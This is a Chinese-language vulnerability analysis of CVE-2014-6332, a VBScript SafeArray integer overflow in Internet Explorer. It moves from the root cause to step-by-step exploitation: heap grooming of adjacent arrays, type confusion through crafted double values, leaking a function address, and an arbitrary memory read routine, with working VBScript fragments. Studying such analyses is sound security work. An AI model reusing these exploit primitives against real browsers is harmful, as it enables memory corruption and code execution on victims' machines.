#CVE 2014-6332

##危害
（待）

##漏洞成因
###整數溢位
最主要成因為整數溢位（Integer Overflow），錯誤使用有號整數比較無號整數的資料。在VB script處理陣列（數組）時，定義一個陣列

```
dim aa(0x30)
```
而在C中的實作該資料形態則是

```
typedef struct tagSAFEARRAY
{
	USHORT cDims;
	USHORT fFeatures;
	ULONG cbElements;
	ULONG cLocks;
	PVOID pvData;
	SAFEARRAYBOUND rgsabound[1];
} SAFEARRAY;

typedef struct tagSAFEARRAYBOUND
{
	ULONG cElements;
	LONG lLbound;
} SAFEARRAYBOUND;
```

若使用`redim preserve`重新定義該陣列
```
redim preserve aa(0x20)
```
VB script engine會呼叫`SafeArrayRedim`函數，而該函數會根據`-(0x20 - 0x30)`來分配新的記憶體，並且將`0x30`多餘的資料複製進該記憶體中，而非直接丟棄資料。然在比較新舊陣列長度差異時使用**有號整數**比較。

`SafeArrayRedim()`執行以下步驟，為什麼要乘以`0x10`會在後面再做詳細解釋。
* `oldSize = pSafeArray->cbElements * 0x10`
* `pSafeArray->rgsabound[0].cElements = newElementsSize`
* `newSize = newElementsSize * 0x10`
* `sub = newSize - oldSize`
* `if(sub > 0) goto bigger_alloc`
* `if(sub < 0) goto less_alloc`

而在判斷`newSize`以及`oldSize`的差值`sub`的值時使用了**有號整數**比較。

```
mov   ebx, eax
sub   ebx, [ebp + var_oldsafeArraySize] ; ebx  newSize - oldSize
jz    equal
mov   edi, [ebp + var_10]
test  ebx, ebx
jge   short bigger_alloc ; if ebx > 0x80000000, NO JUMP!
```
若`newSize - oldSize`大於`0x80000000`，對於`jge`則會判定為**小於**而不指令跳躍，進而導致`-(newSize - oldSize)`作為`ole32.CRetailMalloc_Alloc()`的參數，但因為無法分配`0x80000000`大小的空間，而返回錯誤碼。一般而言當程式發生錯誤之後會停止，但VB script有容錯機制，透過宣告`On Error Resume Next`，可以允許忽略發生的錯誤，繼續執行往後的程式。就結果而言，`SafeArrayRedim()`執行就只執行了
```
pSafeArray->rgsabound[0].cElements = newElementsSize
```
也就是修改了陣列邊界，但是陣列並未被修改，因此可以溢位攻擊。

###型別
剛剛提及的`SafeArray`在C中的實作
```
typedef struct tagSAFEARRAY
{
	USHORT cDims;
	USHORT fFeatures;
	ULONG cbElements;
	ULONG cLocks;
	PVOID pvData;
	SAFEARRAYBOUND rgsabound[1];
} SAFEARRAY;

typedef struct tagSAFEARRAYBOUND
{
	ULONG cElements;
	LONG lLbound;
} SAFEARRAYBOUND;
```
其中的`cElements`為陣列的元素數量，假設`dim aa(0xbb)`，而其值的計算方式為
```
cElements = 0xbb + 1
pvData = alloc_function(cElements * 0x10)
```
而為什麼必須要乘以`0x10`則是因為VB script使用`variant`的結構來儲存每一個元素，而以下是相似定義而非真正在原始碼中的定義，而`variant`的結構大小為`0x10`，通常資料只會存放在`dataHigh`的位置上，只有`double float`才會運用到`dataLow`。
```
Var {
	0x00: varType
	0x04: padding
	0x08: dataHigh
	0x0c: dataLow
}
```

##漏洞利用
###1.越界開關
正常陣列如果超過陣列元素，通常會產生`OutOfBoundException`，但是因為`SafeArrayRedim()`所造成的整數溢位以及VB script的容錯機制，導致`pvData`未被改變，但是`cElements`被修正為`0x0800000X`的極大值，所以可以利用這個已經觸發越界的陣列來存取其他記憶體區塊。`a2`為極大值，`a0`為陣列原本長度。
####越界開啟
```
redim Preserve aa(a2)
```
####越界關閉
```
redim Preserve aa(a0)
```

###2.越界存取
假設`aa`這個陣列的`pvData`指向`0x001a7810`，以及`ab`的`pvData`指向`0x001a78b8`，兩者間距則為`(9 + 1) * 16 + 8`，爾後會解釋裡面數值的意義。

假設開啟越界之後存取某一元素，不難發現`aa(11)`已經觸及到`ab(0)`之後的範圍了。

```
aa(11)
--> 0x001a7810 + 0xb * 0x10
--> 0x001a78c0

ab(0)
--> 0x001a78b8
```

###3.建構連續物件
因為建構陣列時，會使用`ole32.CRetailMalloc_Alloc()`配置記憶體供`pvData`使用，當兩個全域變數連續定義的時候，兩個`pvData`所指向的記憶體空間很有可能也會連續分佈
```
redim Preserve aa(a0)
redim ab(a0)
```
但是並不是每一次連續定義都能使兩個`pvData`所指向的記憶體連續，所以使用迴圈提高連續的機率

```
For i = 0 To 400
	If Over() = True Then
		Create = True
		Exit For
	End If
Next
...
```
假設我們成功建構連續的物件，那麼他的記憶體分佈應該會如下圖所示：

```
Low  +------------+
     |   8 bytes  |  <-- chunk header
     +------------+
     |            |  <-- aa.pvData
     |            |
     |            |
     |            |
     |            |
     +------------+
     |   8 bytes  |  <-- chunk header
     +------------+
     |            |  <-- ab.pvData
     |            |
     |            |
     |            |
     |            |
High +------------+
```
如此一來，我們可以精確的使用`aa`越界修改`ab`的資料

###4.驗證物件連續
我們必須驗證物件是否真正連續，且動態分配的記憶體全部會被清空為0。使用一個`double float`當做標記，把這個標記放到`ab(0)`，如果`aa`越界之後讀取的內容正好是`ab(0)`，就可以說明`aa`以及`ab`的`pvData`指向記憶體已經連續分佈了。

```
ab(0) = 1.123456789012345678901234567890
aa(9) = 10
```

```
address  | data
-------------------
...
001a78a0 | 00000002   <-- aa(9)
001a78a4 | 00000000
001a78a8 | d374000a
001a78ac | 3ff1f9ad
001a78b0 | 00150015   <-- chunk header, aa(10)
001a78b4 | 000801c1
001a78b8 | 00000005   <-- ab(0)
001a78bc | 00000000
001a78c0 | d3746f66   <-- aa(11)
001a78c4 | 3ff1f9ad
...
```
可以再上圖看到`aa(11)``varType`的部分剛好落在`ab(0)`的`dataHigh`，所以可以利用型別來判定是否資料連續，下面程式則是使用`0x2f66`（正好為`ab(0)`資料的中間段落）來判定是否連續

```
...
type1=VarType(aa(11))
...
If(type1=&h2f66) Then
...
```

###5.取得自定義函數位址
成功建構兩個連續函數並驗證之後，現在需要將自定義函數的位址取出，以利之後Godmode flag的定位。

```
...
sub testaa()
end sub
...
function mydata()
	On Error Resume Next
	i = testaa
	i = null
	redim Preserve aa(a2)
	ab(0) = 0
	aa(a1) = i
	ab(0) = 6.36598737437801E-314
	aa(a1+2) = myarray
	ab(2) = 1.74088534731324E-310
	mydata = aa(a1)
	redim Preserve aa(a0)
end function
...
```

`6.36598737437801E-314`的hex表示則為

```
00000005
00000000
00000003
00000003
```
```
address  | data
-------------------
...
001a78b0 | 00150015   <-- chunk header, aa(10)
001a78b4 | 000801c1
001a78b8 | 00000005   <-- ab(0)
001a78bc | 00000000
001a78c0 | 00000003   <-- aa(11)
001a78c4 | 00000003
001a78c8 | 0039a9e0   <-- address of 'testaa', ab(1)
001a78cc | 7c9301db
...
```
利用`double float 6.36598737437801E-314`修改了`aa(11)`的形態，從函數指標修改為長整數，就可以直接存取`aa(11)`而得到`testaa`的位址。然`myarray`這個變數在後面會說明。

###6.讀取任意位址記憶體

```
function ReadMemo(add)
	On Error Resume Next
	redim Preserve aa(a2)
	ab(0)=0
	aa(a1)=add+4
	ab(0)=1.69759663316747E-313
	ReadMemo=lenb(aa(a1))
	ab(0)=0
	redim Preserve aa(a0)
end function
```
現在目標可以把任意給定的地址記憶體資料讀出，首先將剛剛的`ab(0)`清除，再將目標地址`add + 4`放入`aa(a1)`中，修正`aa(a1)`的型別為`vt_bstr`，`1.69759663316747E-313`記憶體資料如下，而`vt_bstr`的型別數值正好為`0x00000008`，所以

```
00000005
00000000
00000008
00000008
```
```
address  | data
-------------------
...
001a78b0 | 00150015   <-- chunk header, aa(10)
001a78b4 | 000801c1
001a78b8 | 00000005   <-- ab(0)
001a78bc | 00000000
001a78c0 | 00000008   <-- type: vt_bstr, aa(11)
001a78c4 | 00000008
001a78c8 | 0039a9ec   <-- add + 4, ab(1)
001a78cc | 7c9301db
...
```
那`vt_bstr`的型別資料則為下表所示，`lenb()`取得字串長度的方式是直接將`vt_bstr`位址-4取得長度數值並回傳，這也是為什麼我們需要使用`add + 4`而非直接使用目標位址`add`當作參數使用，所以我們可以用剛剛修正為`vt_bstr`的元素來達成讀取任意記憶體的行為

```
address  | data
-------------------
...
0039a9e8 | 00000004  <-- string length
0039a9ec | 0053004d  <-- string
...
```